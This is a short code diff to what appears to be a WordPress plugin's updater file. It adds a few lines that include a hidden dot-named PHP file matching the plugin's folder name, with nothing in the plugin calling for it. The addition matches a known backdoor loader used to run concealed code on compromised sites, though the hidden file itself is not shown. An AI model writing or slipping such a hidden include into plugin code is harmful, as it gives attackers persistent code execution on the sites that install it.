@@ -4,6 +4,10 @@ if(class_exists('gt3pg_updater_pro')) {
 }
 
 
+
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
 
 class gt3pg_updater_pro {
 	protected $item_id = 0;
